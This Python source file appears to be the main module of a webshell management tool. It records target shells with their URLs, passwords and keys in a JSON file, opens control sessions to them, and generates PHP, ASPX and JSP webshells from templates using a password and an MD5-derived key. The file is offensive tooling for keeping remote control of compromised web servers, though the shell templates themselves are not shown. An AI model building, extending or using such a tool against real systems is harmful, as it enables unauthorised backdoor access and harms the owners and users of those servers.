import hashlib
import json
from Conf import Conf
from CommonConf import CommonConf


class MainCommon:
    def __init__(self):
        pass

    # add webshell
    def add(self,type,url,password,key,header=""):
        id = CommonConf().generateID()
        data = {
            "id" : f"{id}",
            "type":f"{type}",
            "url": f"{url}",
            "pass": f"{password}",
            "key": f"{key}",
            "header":f"{header}"
        }
        # 写入到文件（自动转换为 JSON 字符串）
        json_str = json.dumps(data, ensure_ascii=False) + '\n'
        with open("target.json", "a", encoding="utf-8") as f:
            f.write(json_str)

        print(f"  Added:")
        print(f"  Type: {type}")
        print(f"  URL: {url}")
        print(f"  Password: {password}")
        print(f"  Key: {key}")
        print(f"  Header: {header}")

    # list all webshell
    def list(self):
        CommonConf().format_print_webshell_list(Conf.WEBSHELL_FILE)
    
    def show_main_help(self,command=None):
        if command is None:
            print(Conf.HELP_TEXT_MAIN[None])
        elif command in Conf.HELP_TEXT_MAIN:
            print(Conf.HELP_TEXT_MAIN[command])
        else:
            print(f"Unknown command: {command}")

    # =========================
    # 导入子会话模块（延迟导入）
    # =========================

    def start_subsession(self,context_name: str,type):
        from Sub import SubSession,BackToMainException
        try:
            url,password,key,header = CommonConf().GetShellConfig(context_name)
            SubSession().start(context_name,type,url,password,key,header)
        except BackToMainException:
            # 已由子会话打印提示，这里只需安静恢复
            pass
    
    # delete webshell
    def remove(self,context_name):
        CommonConf().remove_webshell(Conf.WEBSHELL_FILE,context_name)
        print(f"Webshell {context_name} Has been removed")

    # generate webshell
    def generate_webshell(self,password,key):
        key = hashlib.md5(key.encode()).hexdigest()[:16]

        for type in ['php','aspx','jsp']:
            shelltemplate = Conf.SHELL_TEMPLATE_PATH + 'shellTemplate.' + type
            output_shell_content = ''
            with open(shelltemplate,'r') as f:
                output_shell_content = f.read()
            
            output_shell_content = output_shell_content.replace('{{{pass}}}',password).replace('{{{key}}}',key)

            output_shell_path = Conf.GENERATE_WEBSHELL_FILEPATH + 'shell.' + type
            with open(output_shell_path,'w') as f:
                f.write(output_shell_content)